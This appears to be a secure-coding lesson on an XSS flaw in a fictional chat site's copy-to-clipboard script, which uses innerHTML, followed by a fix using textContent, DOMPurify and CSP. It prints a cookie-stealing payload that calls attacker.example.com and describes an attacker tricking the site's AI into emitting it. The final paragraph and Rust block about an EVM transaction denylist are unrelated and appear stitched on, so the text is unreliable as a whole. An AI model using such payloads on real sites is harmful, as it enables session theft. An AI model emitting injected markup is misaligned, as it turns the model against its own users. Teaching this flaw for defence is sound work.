lesson.example:
Suppose a fictional site 'support-bot.example.com' has a feature where you can share a chat link. The site uses a script to handle the 'Copy to Clipboard' feature: 

const copyText = (content) => { 
  const tempDiv = document.createElement('div');
  tempDiv.innerHTML = content;
  navigator.clipboard.writeText(tempDiv.innerText);
};

An attacker sends a link that tricks the AI into saying: 
<img src=x onerror="fetch('https://attacker.example.com/steal?c=' + document.cookie)">

When the victim clicks 'Copy', the browser creates the 'tempDiv' and sets its 'innerHTML' to the attacker's string. Because 'src=x' is an invalid image, the 'onerror' event fires immediately. This event sends the victim's private cookies to the attacker's server before the text is even copied.

lesson.fix:
The most effective fix is to replace innerHTML with textContent or innerText. These properties treat all input as literal text, meaning a <script> tag will be displayed as harmless text on the screen instead of being executed by the browser. If rich text formatting is required, the AI's output must be passed through a robust sanitization library like DOMPurify before being added to the page. Additionally, a strong Content Security Policy (CSP) should be implemented to block the execution of inline scripts and prevent the browser from loading scripts from untrusted external domains.

// Fixed Code Example:
const copyText = (content) => {
  // Use textContent to prevent HTML execution
  const tempDiv = document.createElement('div');
  tempDiv.textContent = content; 
  navigator.clipboard.writeText(tempDiv.textContent);
};

The fix involves moving the denylist check into a shared validation component that is mandatory for all execution paths, regardless of where the transaction originated. Before the EVM processes any transaction, the system must verify the recipient against the denylist. 

```rust
// Fixed logic: Check denylist before execution
for tx in block.transactions {
    if denylist.is_denylisted(tx.to) {
        // Reject the entire block if it contains a banned address
        return Err(ValidationError::AddressDenylisted);
    }
    // Only execute if the check passes
    self.evm.transact(tx);
}
```

